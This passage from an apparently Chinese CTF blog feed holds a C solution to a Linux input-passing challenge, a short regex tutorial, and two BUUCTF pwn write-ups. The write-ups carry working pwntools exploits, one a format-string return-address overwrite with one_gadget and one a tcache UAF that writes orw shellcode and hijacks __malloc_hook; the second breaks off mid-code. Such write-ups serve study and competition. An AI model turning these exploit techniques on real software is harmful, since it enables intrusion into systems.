class="params">()</span></span>&#123;</span><br><span class="line">    FILE *fd=fopen(<span class="string">&quot;\x0a&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    fwrite(buf,<span class="number">1</span>,<span class="number">4</span>,fd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pipe_stdin[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,pipe_stderr[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">char</span> *env[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;C&#x27;</span>],<span class="string">&quot;55555&quot;</span>);</span><br><span class="line">    env[<span class="number">0</span>]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(env[<span class="number">0</span>],<span class="string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>);</span><br><span class="line">    env[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    pipe(pipe_stdin);</span><br><span class="line">    pipe(pipe_stderr);</span><br><span class="line">    <span class="keyword">int</span> p=fork();</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>)&#123;</span><br><span class="line">        write(pipe_stdin[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">        write(pipe_stderr[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        dup2(pipe_stdin[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">        dup2(pipe_stderr[<span class="number">0</span>],<span class="number">2</span>);</span><br><span class="line">        execve(<span class="string">&quot;./input&quot;</span>,arg,env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    saddr.sin_port = htons(<span class="number">55555</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;connenct\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(connect(sockfd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Cannot connect to server!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(sockfd, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    close(sockfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:<code>Mommy! I learned how to pass various input in Linux :)</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;真的推荐学linux C的IO一定得做做这个，真的能学到很多。&lt;/p&gt;</summary>
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    <category term="IO" scheme="http://example.com/categories/linux/IO/"/>
    
    
  </entry>
  
  <entry>
    <title>正则表达式的使用</title>
    <link href="http://example.com/2021/11/19/Re/"/>
    <id>http://example.com/2021/11/19/Re/</id>
    <published>2021-11-19T02:00:00.000Z</published>
    <updated>2021-11-20T14:37:28.902Z</updated>
    
    <content type="html"><![CDATA[<p>最近在和战队一起的比赛中又出现了诸多想要学习的知识点，那就是re和QRcode，今天先学一下这个正则吧。</p><span id="more"></span><p>那么我已开始接触正则呢，应该是在学爬虫的时候，因为当时爬虫学的不太好也就没有接着学正则匹配。后来在换了linux系统之后经常会用到一个很有用的东西，那就是|grep。不得不说这个在找东西的时候真的是很有用的，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ls -l | grep &quot;&quot;</span><br></pre></td></tr></table></figure><p>那么本次和Nepnep战队参加xctf分区赛也是有一道修复二维码的题目，当时师傅们可能有些点没注意到，导致最后修复的二维码多达16000的扫描结果。</p><p><img src="/2021/11/19/Re/1.png" alt="1"></p><p>得到结果之后本以为要经历漫长的人工过滤，可是咱们战队的一位爷爷直接solved，而这位爷爷就是直接用了正则匹配。</p><p><img src="/2021/11/19/Re/2.png" alt="2"></p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p><p>许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。</p><p>以上来自维基百科。</p><h3 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h3><p>右斜杠(\)老转义符了，在右斜杠之后的一个字将会带有特殊含义，如果要匹配右斜杠则需要双写。</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>通配符我们熟知的就是星号(*)和问号(?)，一般情况下它们分别代表任意多个字符或者是任意一个字符，在正则表达式中存在三种类似的符号，并且不能匹配任意字符，只能代表前面一个字符的数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+：匹配一个或多个字符</span><br><span class="line">?：匹配一个或零个字符</span><br><span class="line">*：匹配零个或多个字符</span><br></pre></td></tr></table></figure><p>例如</p><p>‘a+’可以匹配’a’,’aa’,’aaa’,’aaaa’……等字符串。</p><p>‘a?’可以匹配’a’或者空串</p><p>‘a*’则可以匹配第一种情况和第二种情况的并集。</p><h3 id="匹配任意字符"><a href="#匹配任意字符" class="headerlink" title="匹配任意字符"></a>匹配任意字符</h3><p>[]方括号用于匹配单个字符。</p><p>例如</p><p>[abcde]可以匹配a,b,c,d,e中的任意一个字符。</p><p>如果加上^则代表匹配除了列表以外的所有字符。</p><p>例如</p><p>[^a]表示匹配所有非’a’的字符。</p><h3 id="匹配次数限定"><a href="#匹配次数限定" class="headerlink" title="匹配次数限定"></a>匹配次数限定</h3><p>{}用于限定匹配次数</p><p>例如：</p><p>[ab]{3}表示[ab]匹配三次，[ab]{3,}表示至少匹配三次。</p><p>就先学这么多吧，后续再学就再加。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在和战队一起的比赛中又出现了诸多想要学习的知识点，那就是re和QRcode，今天先学一下这个正则吧。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
  <entry>
    <title>npuctf_2020_level2 writeup</title>
    <link href="http://example.com/2021/11/10/npuctf_2020_level2/"/>
    <id>http://example.com/2021/11/10/npuctf_2020_level2/</id>
    <published>2021-11-10T14:00:00.000Z</published>
    <updated>2021-11-12T07:56:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#npuctf_2020_level2">npuctf_2020_level2</a></p><span id="more"></span><p>这题刷新了我对格式化字符串的利用，来康康吧。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>十分简单，就是主函数while循环输入然后格式化字符串漏洞，但是不同的是这个格式化字符串并不在stack段而是在bss段上的。那就考虑考虑字符串在bss段和在stack段的区别，我们平时做的都是在stack段的，因为buf输入一般都是在printf调用之前，所以printf的栈帧会比buf低，而参数在高地址，那么此时printf的参数我们就可控，在buf上写上一个地址然后算出偏移用%n格式串去写就能基本达到任意title写的目的。但是如果它在bss段上或者是在堆上，那么格式化字符串的参数控制不了我们就得另寻方法了。其实也还好，第一步我们可以先控制一个栈的参数，栈里面都会有存函数的ebp，那么可以通过这个来写一个目的地址，再通过目的地址任意写我们想写的内容。讲简单一点其实也就是控制一个栈的地址然后写上目的地址，最后再往目的地址写东西，有格式化字符串漏洞那么基本stack，code和libc地址跟送的一样随便泄露。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>先gdb起这个程序，然后运行到printf这边观察栈情况。</p><p><img src="/2021/11/10/npuctf_2020_level2/1.png" alt="1"></p><p>可以观察到libc的应该是第7个参数，第9个参数有一个栈地址，第六个参数和第11个参数有一个程序加载地址可以泄露。这里的参数个数指的是排除格式化字符串参数后的计数，比如printf(“%d”,1);这里我就直接把1当成第一个参数了。</p><p>所以开局三个地址都出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.send(<span class="string">b&#x27;%7$p\n%9$p\n%11$p\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x21b97</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">code_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x79a</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&#x27;code_addr:&#x27;</span>+<span class="built_in">hex</span>(code_addr))</span><br></pre></td></tr></table></figure><p>然后可以看到那个libc得到的值实际上是返回地址，因为main的父函数就是libc_start_main函数嘛。所以我们应该要写这里，怎么写呢？通过栈地址，我们可以通过修改第9个参数的低两个字节到返回地址，然后再%n覆盖，因为不能一次写太多，所以每一次修改最多两个字节，然后马上把这个地址向后移两位然后再写两个字节，至于写什么，那自然是one_gadget最简便了，并且第一个就符合条件了。但是实际操作的时候我傻了，我是通过这个地址写到另一个地址的低两位字节改成了返回地址再通过那个写的，现在想来是在多此一举，但是这样的好处就是可以实现真正的任意写，假如这个题目变成noreturn，那么就只能靠劫持一些hook或者got表来实现指令跳转了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">2.23 64 libc的one_gadget条件分别是rax,[rsp+0x30,+0x50,+0x70]==NULL</span></span><br><span class="line"><span class="string">2.27 64 libc的one_gadget条件分别是rsp&amp;0xf==0&amp;&amp;rcx==0 || [rsp+0x40，+0x70]==NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">one_2_23_32=[<span class="number">0x3ac6c</span>,<span class="number">0x3ac6e</span>,<span class="number">0x3ac72</span>,<span class="number">0x3ac79</span>,<span class="number">0x5fbd5</span>,<span class="number">0x5fbd6</span>]</span><br><span class="line">one_2_23_64=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_2_23_buu32=[<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">one_2_23_buu64=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_2_27_32=[<span class="number">0x3d123</span>,<span class="number">0x3d125</span>,<span class="number">0x3d129</span>,<span class="number">0x3d130</span>,<span class="number">0x67b4f</span>,<span class="number">0x67b50</span>,<span class="number">0x1380be</span>,<span class="number">0x1380bf</span>]</span><br><span class="line">one_2_27_64=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">one_2_27_buu32=[<span class="number">0x3cbea</span>,<span class="number">0x3cbec</span>,<span class="number">0x3cbf0</span>,<span class="number">0x3cbf7</span>,<span class="number">0x6729f</span>,<span class="number">0x672a0</span>,<span class="number">0x13573e</span>,<span class="number">0x13573f</span>]</span><br><span class="line">one_2_27_buu64=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span>,ip=<span class="string">&#x27;node4.buuoj.cn&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> one</span><br><span class="line">    bit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> context.arch==<span class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    one=<span class="built_in">eval</span>(<span class="string">&#x27;one_&#x27;</span>+libc_version.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;_&#x27;</span>)+<span class="string">&#x27;_&#x27;</span>+(<span class="keyword">not</span> x)*<span class="string">&#x27;buu&#x27;</span>+<span class="built_in">str</span>(bit))</span><br><span class="line">    libc=<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+(<span class="keyword">not</span> x)*<span class="string">&#x27;buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        context.log_level=<span class="number">20</span></span><br><span class="line">        p=remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),ELF(libc),p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;note: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,length,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note: &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;note: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./npuctf_2020_level2&#x27;</span>,port=<span class="number">26764</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;%7$p\n%9$p\n%11$p\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x21b97</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">code_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x79a</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&#x27;code_addr:&#x27;</span>+<span class="built_in">hex</span>(code_addr))</span><br><span class="line"></span><br><span class="line">shell=libc_addr+one[<span class="number">0</span>]</span><br><span class="line">success(<span class="string">&#x27;shell:&#x27;</span>+<span class="built_in">hex</span>(shell))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">8</span>:<span class="keyword">break</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)+i).encode()+<span class="string">b&#x27;c%9$hn\n\0&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    val=shell&amp;<span class="number">0xffff</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(val).encode()+<span class="string">b&#x27;c%35$hn\n\0&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    success(<span class="string">&#x27;debug:&#x27;</span>+<span class="built_in">hex</span>(val))</span><br><span class="line">    shell&gt;&gt;=<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">success(<span class="string">&#x27;one:&#x27;</span>+<span class="built_in">hex</span>(libc_addr+one[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;66666666\0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录—&lt;a href=&quot;https://buuoj.cn/challenges#npuctf_2020_level2&quot;&gt;npuctf_2020_level2&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>SWPUCTF_2019_p1KkHeap writeup</title>
    <link href="http://example.com/2021/11/10/SWPUCTF_2019_p1KkHeap/"/>
    <id>http://example.com/2021/11/10/SWPUCTF_2019_p1KkHeap/</id>
    <published>2021-11-10T14:00:00.000Z</published>
    <updated>2021-11-20T14:37:25.428Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#SWPUCTF_2019_p1KkHeap">SWPUCTF_2019_p1KkHeap</a></p><span id="more"></span><p>这波又刷新了我对2.27版本libc的认知。那就是tcache struct ，话不多说看题。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>64位保护全开，习惯就好。载入IDA查看发现plt表有很多函数，其中有<code>mmap</code>和<code>prctl</code>，<code>prctl</code>最常见的就是设置沙箱规则，<code>mmap</code>最常见的就是直接给一个可读可写可执行的一片内存区域，那么我们返回终端查看一下沙箱规则。</p><p><img src="/2021/11/10/SWPUCTF_2019_p1KkHeap/1.png" alt="1"></p><p>这个有点复杂，不过大概率就可以认为他给你禁用了<code>execve</code>，其它的基本不用管，大概意思就是<code>write</code>函数的<code>count</code>必须非负，且大小在32位int范围内，并且不能=0x10，有一说一这个0x10并不理解为啥限制这个不能等于0x10，因为我读<code>flag</code>一般是读0x40</p><p>我们看看初始化函数，可以看到<code>mmap</code>分配了一片很大的内存并且是可读可写可执行的权限，那么开了沙箱之后我们就能往里面写<code>orw</code>的<code>shellcode</code>，然后再劫持某些东西让它跳转到这个区域。</p><p>分析逻辑， 经典堆菜单题目，包含了增删改查，但是有一个全局变量一直在++并且循环并非while 1，可以发现这个初始值为0x12，意味着我们只能操作18次。先看删除，发现删除没有把指针清零，存在<code>UAF</code>，但是会把另一个东西清零，并且跟外面一样，删除有次数限制，只有三次机会。添加堆块会现寻找第一个指针不为0的指针，然后分配，最多同时存在八个堆块，size被限定在0x100以内。<code>show</code>会直接打印堆块上面的信息，<code>edit</code>就是根据输入的<code>size</code>读入数据，删除会导致无法edit，但是不影响show，所以这个地方可以用于泄露，后面的利用也都以uaf为基础攻击。</p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>这里需要注意，glibc在2.26版本加入了tcache，tcache在堆上管理，会分配一个0x250大小的堆块，这就是一个tcache struct 上面会存储每个size tcache 的个数和tcache第一个堆块的地址。首先double free然后show 泄露heap的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>泄露了之后我们接下来需要申请堆块到tcache struct上面来进行一些操作方便我们修改某些东西。我们都知道，每个大小的tcache bin最多存在7个，超过则会对应进入fastbin 或者 unsorted bin。那么我们把size改成7然后再free 再show就可以泄露libc的地址了。我们还可以顺便把第一个tcache的地址改成那个分配的可读可写可执行的区域，等会直接申请就可以在上面写数据了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr+<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>最后比较简单，就是写shellcode orw然后劫持malloc hook而已。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span 